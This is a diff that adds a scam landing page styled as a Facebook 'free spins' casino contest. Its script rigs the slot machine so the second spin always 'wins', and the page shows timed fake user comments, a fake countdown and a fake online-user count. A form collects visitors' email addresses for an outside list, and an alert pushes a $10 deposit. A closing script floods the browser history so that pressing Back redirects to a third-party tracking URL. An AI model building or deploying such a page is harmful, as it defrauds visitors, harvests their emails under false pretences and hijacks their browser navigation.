@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <base href="#">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="viewport" content="initial-scale=1">
+    <link href="css/s.css" rel="stylesheet" type="text/css">
+    <title>Facebook Free Spins Contest</title>
+</head>
+
+<body>
+    <p><audio autoplay="autoplay" preload="">
+            <source src="sounds/alert.ogg" type="audio/ogg" />
+            <source src="sounds/alert.mp3" type="audio/mpeg" />
+        </audio> <audio id="slot-win-audio" preload="">
+            <source src="sounds/win.mp3" type="audio/mpeg" />
+        </audio> <audio id="slot-spin-audio" preload="">
+            <source src="sounds/spin.mp3" type="audio/mpeg" />
+        </audio></p>
+    <div class="fbheader">
+        <table class="fbwrapper">
+            <tbody>
+                <tr>
+                    <td width="10"><img src="images/icon-search.png" />
+                    <td style="text-align: center; color: #fff; font-size: 20px;" width="80">News
+                    <td width="10" align="right"><img src="images/icon-account.png" />
+            </tbody>
+        </table>
+    </div>
+    <div class="fbsubheader">
+        <table class="fbwrapper">
+            <tbody>
+                <tr>
+                    <td width="30" align="center"><img src="images/status.png" />
+                    <td width="30" align="center"><img src="images/photo.png" />
+                    <td width="30" align="center"><img src="images/checkin.png" />
+            </tbody>
+        </table>
+    </div>
+    <div class="wrapper">
+        <h2 class="everyday" style="background-color: #fff; color: #000;">TODAY ONLY:<br /><span
+                style="color: red;">Claim (2) Free Spins</span> Below</h2>
+        <center style="padding: 5px;"><span>Paid Out: <strong style="color: #ffad00;">$<span
+                        id="jackpot">2,493,997.33</span></strong> </span></center>
+        <center style="padding: 5px;">SPIN BEFORE: <span id="cdtime">00:05:23:010</span></center>
+        <div class="roll">
+            <div><strong> <button id="spin" style="cursor: pointer;" onclick="myFunction()"> <img class="arrow-left"
+                            src="images/red-arrow-left.png" /> Spin <img class="arrow-right"
+                            src="images/red-arrow-right.png" /> </button> <button id="stop"
+                        style="display:none; cursor: pointer;">Stop</button> <button id="spin2"
+                        style="display:none; cursor: pointer;"> <img class="arrow-left"
+                            src="images/red-arrow-left.png" /> Spin <img class="arrow-right"
+                            src="images/red-arrow-right.png" /> </button> <button id="stop2"
+                        style="display:none; cursor: pointer;">Stop</button> <button id="spin3"
+                        style="display:none; cursor: pointer;"> <img class="arrow-left"
+                            src="images/red-arrow-left.png" /> Spin <img class="arrow-right"
+                            src="images/red-arrow-right.png" /> </button> <button id="stop3"
+                        style="display:none; cursor: pointer;">Stop</button> </strong></div>
+            <div class="wheeldiv"><strong> <img class="slot" id="slot-start" src="images/slot-start.png" /> <img
+                        class="slot slot-hidden" id="slot-spin" src="images/slot-spin.gif" /> <img
+                        class="slot slot-hidden" id="slot-result-1" src="images/slot-result-1.png" /> <img
+                        class="slot slot-hidden" id="slot-result-2" src="images/slot-result-2.png" /> <img
+                        class="slot slot-hidden" id="slot-win" src="images/slot-win.png" /> </strong></div>
+            <div class="miss" style="display:none;">
+                <p class="received">SORRY, YOU MISSED!</p>
+                <p class="receivedbot">You have more spins</p>
+            </div>
+            <div class="info">
+                <div class="blink" style="opacity: 0.403843410654006;">
+                    <p class="received"><span style="color: #fff!important;">YOU HAVE 200 FREE SPINS</span></p>
+                    <p class="receivedbot"><strong>to win 150 CHANCES TO WIN THIS JACKPOT : $2,493,997.17<br />$10
+                            Deposit to Win this Jackpot!</strong></p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="question" style="display:none;">
+        <div class="topques">
+            <p class="received"><strong>CONGRATULATIONS!</strong></p>
+            <p class="receivedbot"><strong>You are nearly there!!</strong></p>
+        </div>
+        <p class="threeq"><strong>Now answer these 3 questions:</strong></p>
+        <div id="q1">
+            <div class="boxin">
+                <p class="questnum"><strong>QUESTION 1</strong></p>
+                <p class="quest"><strong>Are you over 18?</strong></p>
+            </div><strong><button class="yesno">Yes</button>&nbsp;&nbsp;<button class="yesno">No</button> </strong>
+        </div>
+        <div id="q2" style="display:none;">
+            <div class="boxin">
+                <p class="questnum"><strong>QUESTION 2</strong></p>
+                <p class="quest"><strong>Have you ever won anything online?? </strong></p>
+            </div><strong><button class="yesno">Yes</button>&nbsp;&nbsp;<button class="yesno">No</button> </strong>
+        </div>
+        <div id="q3" style="display:none;">
+            <div class="boxin">
+                <p class="questnum"><strong>QUESTION 3</strong></p>
+                <p class="quest"><strong>Do you have a valid email address?</strong></p>
+            </div><strong><button class="yesno">Yes</button>&nbsp;&nbsp;<button class="yesno">No</button> </strong>
+        </div>
+        <div class="loading" style="display:none;">
+            <p class="analyzing"><strong>Checking answers, please wait...</strong></p>
+            <div class="bar">
+                <div class="active"></div>
+            </div>
+        </div>
+    </div> 
+    <div class="finaldiv" style="display:none">
+        <div class="finalinfo">
+            <div class="blinkfinal">
+                <p class="received"><strong>CONGRATULATIONS YOU WON!</strong></p>
+                <p class="receivedbot"><strong>Claim Your Prize Below:</strong></p>
+                <div>
+                    <div class="txt cta clearfix finalinfo" style="margin: 0 auto; width: 100%; text-align: left;">
+                        <p style="text-align: center;">Claim Your $1,600 free</p>
+                        <p class="red" style="text-align: center;"><span class="aval"></span> (2) Spots Available</p>
+                    </div>
+               
+                    </div>
+            </div>
+        </div>
+        <div>
+            <p><strong></strong></p>
+            <div class="cta clearfix" onclick=""><strong>Claim Your 100 CHANCES TO WIN THIS JACKPOT :
+                    $2,493,997.17</strong></div><span class="red"><strong></strong></span>
+            <div class="cta clearfix" onclick=""><strong>(2) Spots Available</strong></div>
+        </div>
+
+        <div id="form-section">
+            
+            <form action="https://cas-track.online/sendy/subscribe" method="POST" accept-charset="utf-8">
+                <label for="email">Email</label><br/>
+                <input type="email" name="email" id="email" required /><br/>
+                
+                <!-- Honeypot (防止机器人) -->
+                <div style="display:none;">
+                    <label for="hp">HP</label><br/>
+                    <input type="text" name="hp" id="hp"/>
+                </div>
+            
+                <input type="hidden" name="list" value="Fm4UY1D4JXfyn6nSE4UhJg"/>
+                <input type="hidden" name="subform" value="yes"/>
+                <input type="submit" name="submit" id="submit" value="Subscribe Now"/>
+            </form>
+        </div>
+
+    </div>
+    <div class="comments"
+        style="background-color: #fff; border-top-left-radius: 5px; border-top-right-radius: 5px; border-bottom-right-radius: 5px; border-bottom-left-radius: 5px; margin-bottom: 10px; margin-top: 17px;">
+        <div class="fbcoms">
+            <p class="comments"><strong>Comments:</strong></p>
+            <p class="buttons"><strong><span class="like">Like</span> . <span>Comment</span> . <span>Share</span> .
+                    <span>Delete</span> </strong></p>
+            <p class="totlikes"><strong><span class="fbblue">14,073 others</span> like this</strong></p>
+            <p class="viewmore clearfix"><strong><span class="left">View more comments</span> <span class="right">50 of
+                        80,312</span> </strong></p>
+            <div class="item hidden" id="fb8" style="opacity: 0.9999999999999999; display: block;"><strong><img
+                        class="profileimg" height="50" src="images/img1.jpg" width="50" /> </strong>
+                <p class="comtxt" style="opacity: 0.9999999999999999; display: block;"><strong><span class="name">Alex
+                            Goodwin</span> I never have any luck with these sorts of things, I don&rsquo;t even know why
+                        I try.</strong></p><strong> </strong>
+                <p class="combot" style="opacity: 0.9999999999999999; display: block;"><strong><span class="ago">Just
+                            Now</span> . <span class="fblike">Like</span></strong></p><strong> </strong>
+            </div>
+            <div class="item hidden" id="fb7"><strong><img class="profileimg" height="50" src="images/img2.jpg"
+                        width="50" /> </strong>
+                <p class="comtxt"><strong><span class="name">Sam Bailey</span> Boom! Just won $1,000. If I win the
+                        jackpot, maybe my girl of my dreams will appear. lol</strong></p><strong> </strong>
+                <p class="combot"><strong><span class="ago">Just Now</span> . <span class="fblike">Like</span></strong>
+                </p><strong> </strong>
+            </div>
+            <div class="item hidden" id="fb6"><strong><img class="profileimg" height="50" src="images/yWwCB4c.jpg"
+                        width="50" /> </strong>
+                <p class="comtxt"><strong><span class="name">Brandy Douglas</span> #lost </strong></p><strong> </strong>
+                <p class="combot"><strong><span class="ago">Just Now</span> . <span class="fblike">Like</span></strong>
+                </p><strong> </strong>
+            </div>
+            <div class="item hidden" id="fb5"><strong><img class="profileimg" height="50" src="images/3temv7e.jpg"
+                        width="50" /> </strong>
+                <p class="comtxt" style="display: block;"><strong><span class="name">Aidan Parkinson</span> $100 richer!
+                        That was easy. Thank you for the deposit!</strong></p><strong> </strong>
+                <p class="combot" style="display: block;"><strong><span class="ago">Just Now</span> . <span
+                            class="fblike">Like</span></strong></p><strong> </strong>
+            </div>
+            <div class="item hidden" id="fb4" style="display: block; opacity: 1;"><strong><img class="profileimg"
+                        height="50" src="images/7wSpKDu.jpg" width="50" /> </strong>
+                <p class="comtxt" style="display: block;"><strong><span class="name">Jordan Morrison</span> The spinner
+                        doesn&rsquo;t work on my iPhone. Is anyone else having this problem?</strong></p><strong>
+                </strong>
+                <p class="combot" style="display: block;"><strong><span class="ago">Just Now</span> . <span
+                            class="fblike">Like</span></strong></p><strong> </strong>
+            </div>
+            <div class="item hidden" id="fb3" style="display: block; opacity: 1;"><strong><img class="profileimg"
+                        height="50" src="images/9PH2QqX.jpg" width="50" /> </strong>
+                <p class="comtxt" style="display: block;"><strong><span class="name">Benjamin Power</span> I&rsquo;ve
+                        been trying to win this jackpot for the past 2 weeks. The last jackpot was $3 million and given
+                        to a guy named Greg that lived in my neighborhood. This jackpot is the biggest they&rsquo;ve
+                        ever had. Its going to hit soon. Unfortunately, I didn&rsquo;t win any free spins, but
+                        that&rsquo;s not stopping me from paying for spins.</strong></p><strong> </strong>
+                <p class="combot" style="display: block;"><strong><span class="ago">Just Now</span> . <span
+                            class="fblike">Like</span></strong></p><strong> </strong>
+            </div>
+            <div class="item hidden" id="fb2" style="display: block; opacity: 1;"><strong><img class="profileimg"
+                        height="50" src="images/EKZrmbS.jpg" width="50" /> </strong>
+                <p class="comtxt" style="display: block;"><strong><span class="name">Sam Lewis</span> how do I get the
+                        mystery prize . i want that instead of money </strong></p><strong> </strong>
+                <p class="combot" style="display: block;"><strong><span class="ago">Just Now</span> . <span
+                            class="fblike">Like</span></strong></p><strong> </strong>
+            </div>
+            <div class="item hidden" id="fb1" style="display: block; opacity: 1;"><strong><img class="profileimg"
+                        height="50" src="images/yEUMY3v.jpg" width="50" /> </strong>
+                <p class="comtxt" style="display: block;"><strong><span class="name">Owen Edwards</span> My wife said
+                        that the chances of winning are better than getting struck by lightening. So I'm standing in a
+                        pool with an electric rod. hahahah jk </strong></p><strong> </strong>
+                <p class="combot" style="display: block;"><strong><span class="ago">Just Now</span> . <span
+                            class="fblike">Like</span></strong></p><strong> </strong>
+            </div>
+            <div class="item"><strong><img class="profileimg" height="48" src="images/KqX499j.png" width="48" />
+                </strong>
+                <p class="comtxt"><strong><span class="name">Jade Fuller</span> Can I try again cuz it spun without my
+                        tapping and then i lost. </strong></p><strong> </strong>
+                <p class="combot"><strong><span class="ago">11 minutes ago</span> . <span
+                            class="fblike">Like</span><span class="likes totlikes">267</span></strong></p><strong>
+                </strong>
+            </div>
+            <div class="item"><strong><img class="profileimg" height="48" src="images/DsrKpkj.jpg" width="48" />
+                </strong>
+                <p class="comtxt"><strong><span class="name">Charlie Reynolds</span> I couldnt believe it that I
+                        actually won. It was my dream to have an item.</strong></p><strong> </strong>
+                <p class="combot"><strong><span class="ago">17 minutes ago</span> . <span
+                            class="fblike">Like</span><span class="likes totlikes">63</span></strong></p><strong>
+                </strong>
+            </div>
+            <div class="item"><strong><img class="profileimg" height="51" src="images/plR22yu.jpg" width="51" />
+                </strong>
+                <p class="comtxt"><strong><span class="name">Eric Stokes</span> Hit the $0.......story of my life. Was
+                        hoping for some beer and pizza money for tonight! </strong></p><strong> </strong>
+                <p class="combot"><strong><span class="ago">19 minutes ago</span> . <span
+                            class="fblike">Like</span><span class="likes totlikes">112</span></strong></p><strong>
+                </strong>
+            </div>
+        </div>
+    </div>
+    <div class="users-online"
+        style="position: fixed; bottom: 0; right: 0; color: white; background-color: #3b5998; padding: 5px 10px; z-index: 5; font-weight: bold; text-shadow: 0 -1px 0 rgba(0,0,0,0.3); border-radius: 4px 0 0 0;">
+        <img src="images/logo.png" /> <span>184</span> Users Online</div>
+    <style>
+        .blink {
+            -webkit-transition: opacity .3s ease-in-out;
+            -moz-transition: opacity .3s ease-in-out;
+            -ms-transition: opacity .3s ease-in-out;
+            -o-transition: opacity .3s ease-in-out;
+            opacity: 0
+        }
+
+        .blinkfinal {
+            -webkit-transition: opacity .3s ease-in-out;
+            -moz-transition: opacity .3s ease-in-out;
+            -ms-transition: opacity .3s ease-in-out;
+            -o-transition: opacity .3s ease-in-out;
+            opacity: 0
+        }
+    </style>
+    <p><strong>
+            <script type="text/javascript"> function fadeOut(el) {
+                    el.style.opacity = 1;
+                    (function fade() { if ((el.style.opacity -= .1) < 0) { el.style.display = "none" } else { requestAnimationFrame(fade) } })()
+                }
+                function fadeIn(el, display) {
+                    el.style.opacity = 0;
+                    el.style.display = display || "block";
+                    (function fade() {
+                        var val = parseFloat(el.style.opacity); if (!((val += .1) > 1)) {
+                            el.style.opacity = val;
+                            requestAnimationFrame(fade)
+                        }
+                    })()
+                }
+                function FBcom(a, b) {
+                    setTimeout(function () {
+                        var test = document.querySelectorAll(a + ", " + a + " .comtxt, " + a + " .combot"); var x1 = document.getElementById(a); var x2 = document.querySelector('#' + a + ' .comtxt'); var x3 = document.querySelector('#' + a + ' .combot');
+                        fadeIn(x1);
+                        fadeIn(x2);
+                        fadeIn(x3)
+                    }, b)
+                } (function () {
+                    FBcom("fb8", 3000);
+                    FBcom("fb5", 30500);
+                    FBcom("fb6", 53000);
+                    FBcom("fb7", 75000);
+                    FBcom("fb8", 90000);
+                    var s = document.getElementsByClassName('blink')[0].style;
+                    setInterval(function () {
+                        s.opacity = .403843410654006;
+                        setTimeout(function () { s.opacity = 0 }, 600)
+                    }, 1000);
+                    document.getElementById('stop').style.display = "none";
+                    document.getElementById('spin2').style.display = "none";
+                    document.getElementById('stop2').style.display = "none";
+                    document.getElementById('stop3').style.display = "none";
+                    document.getElementById('spin3').style.display = "none";
+                    document.getElementById('q2').style.display = "none";
+                    document.getElementById('q3').style.display = "none";
+                    document.getElementsByClassName('miss')[0].style.display = "none";
+                    document.getElementsByClassName('question')[0].style.display = "none";
+                    document.getElementsByClassName('loading')[0].style.display = "none";
+                    document.getElementsByClassName('finaldiv')[0].style.display = "none";
+                    document.getElementById('spin').onclick = function () {
+                        document.getElementById('spin').style.display = "none";
+                        document.getElementById('slot-start').style.display = "none";
+                        document.getElementsByClassName('info')[0].style.display = "none";
+                        document.getElementById('stop').style.display = "block";
+                        document.getElementById('slot-spin').style.display = "inline";
+                        document.getElementById('slot-spin-audio').play(); var x = document.getElementsByClassName('receivedbot'); for (var i = 0; i < x.length; i++) { x[i].innerHTML = "You have 1 more spin!" }
+                    }
+                    document.getElementById('stop').onclick = function () {
+                        document.getElementById('stop').style.display = "none";
+                        document.getElementById('slot-spin').style.display = "none";
+                        document.getElementById('slot-result-1').style.display = "inline";
+                        document.getElementById('spin2').style.display = "block"; var z = document.getElementsByClassName('miss')[0];
+                        fadeIn(z);
+                        setTimeout(function () { fadeOut(z) }, 1500)
+                    }
+                    document.getElementById('spin2').onclick = function () {
+                        document.getElementById('spin2').style.display = "none";
+                        document.getElementById('slot-result-1').style.display = "none";
+                        document.getElementById('stop2').style.display = "block";
+                        document.getElementById('slot-spin').style.display = "inline";
+                        document.getElementById('slot-spin-audio').play(); var x = document.getElementsByClassName('receivedbot'); for (var i = 0; i < x.length; i++) { x[i].innerHTML = "You have 1 more spin, good luck!" }
+                    }
+                    document.getElementById('stop2').onclick = function () {
+                        document.getElementById('stop2').style.display = "none";
+                        document.getElementById('slot-spin').style.display = "none";
+                        document.getElementById('slot-win').style.display = "inline";
+                        document.getElementById('slot-win-audio').play();
+                        var x1 = document.getElementsByClassName('received');
+                        var x2 = document.getElementsByClassName('receivedbot');
+                        for (var i = 0; i < x1.length; i++) { x1[i].innerHTML = "CONGRATULATIONS!" }
+                        for (var i = 0; i < x2.length; i++) { x2[i].innerHTML = "You Are The Winner!!" }
+                        var z2 = document.getElementsByClassName('miss')[0];
+                        fadeIn(z2);
+                        setTimeout(function () {
+                            document.getElementsByClassName('roll')[0].style.display = "none";
+                            document.getElementsByClassName('question')[0].style.display = "block"
+                        }, 1500)
+                    }
+                    var q1 = document.querySelectorAll('#q1 .yesno');
+                    for (var i = 0; i < q1.length; i++) {
+                        q1[i].addEventListener('click', function () {
+                            document.getElementById('q1').style.display = "none";
+                            document.getElementById('q2').style.display = "block"
+                        }, !1)
+                    }
+                    var q2 = document.querySelectorAll('#q2 .yesno');
+                    for (var i = 0; i < q1.length; i++) {
+                        q2[i].addEventListener('click', function () {
+                            document.getElementById('q2').style.display = "none";
+                            document.getElementById('q3').style.display = "block"
+                        }, !1)
+                    }
+                    var q3 = document.querySelectorAll('#q3 .yesno');
+                    for (var i = 0; i < q3.length; i++) {
+                        q3[i].addEventListener('click', function () {
+                            document.getElementById('q3').style.display = "none";
+                            document.getElementsByClassName('threeq')[0].style.display = "none";
+                            document.getElementsByClassName('loading')[0].style.display = "block"; var elem = document.getElementsByClassName("active")[0]; var pos = 0; var id = setInterval(frame, 35);
+                            function frame() {
+                                if (pos == 100) {
+                                    clearInterval(id);
+                                    document.getElementsByClassName('question')[0].style.display = "none";
+                                    document.getElementsByClassName('everyday')[0].style.display = "none";
+                                    document.getElementsByClassName('finaldiv')[0].style.display = "block"; var s = document.getElementsByClassName('blinkfinal')[0].style;
+                                    setInterval(function () {
+                                        s.opacity = 1;
+                                        setTimeout(function () { s.opacity = 0 }, 300)
+                                    }, 600)
+                                } else {
+                                    pos++;
+                                    elem.style.width = pos + '%'
+                                }
+                            }
+                        }, !1)
+                    }
+                    var ll = ['like', 'fblike'];
+                    for (var i = 0; i < ll.length; i++) {
+                        var ff = document.getElementsByClassName(ll[i]); for (var t = 0; t < ff.length; t++) {
+                            ff[t].addEventListener('click', function () {
+                                if (this.classList.contains('selected')) {
+                                    this.classList.remove('selected');
+                                    this.innerHTML = "Like"
+                                } else {
+                                    this.classList.add('selected');
+                                    this.innerHTML = "Unlike"
+                                }
+                            }, !1)
+                        }
+                    }
+                }())
+            </script>
+            <script language="Javascript"> var hoursleft = 1;
+                var minutesleft = 5;
+                var secondsleft = 23;
+                var millisecondsleft = 10;
+                var finishedtext = "Last Chance!";
+                end = new Date();
+                end.setMinutes(end.getMinutes() + minutesleft);
+                end.setSeconds(end.getSeconds() + secondsleft);
+                end.setMilliseconds(end.getMilliseconds() + millisecondsleft);
+                function cd() {
+                    now = new Date();
+                    diff = end - now;
+                    diff = new Date(diff);
+                    var f = diff.getMilliseconds();
+                    var d = diff.getSeconds();
+                    var e = diff.getMinutes();
+                    if (e < 10) { e = "0" + e }
+                    if (d < 10) { d = "0" + d }
+                    if (f < 10) { f = "00" + f } else { if (f < 100) { f = "0" + f } }
+                    if (now >= end) {
+                        clearTimeout(timerID);
+                        document.getElementById("cdtime").innerHTML = finishedtext
+                    } else { document.getElementById("cdtime").innerHTML = "00:" + e + ":" + d + ":" + f }
+                    timerID = setTimeout("cd()", 45)
+                }
+                cd()
+            </script>
+        </strong></p>
+     <script
+        type="text/javascript">window.setTimeout(function () { alert('$10 deposit to claim $100 free bets and 200 free spins! Get it now!'); }, 2000);</script>
+    <script>!function () {
+            var t;
+            var tmp = 'https://gry.unicornpride123.com/l.php?trf=m&p=custom_10hj6o9ftk&d=5d9e2b802b441f03f25a6c84';
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, '', '');
+                onpopstate = function (t) {
+                    t.state && location.replace(tmp);
+                }
+            } catch (o) {
+            }
+        }();</script>
+</body>
+
+</html>
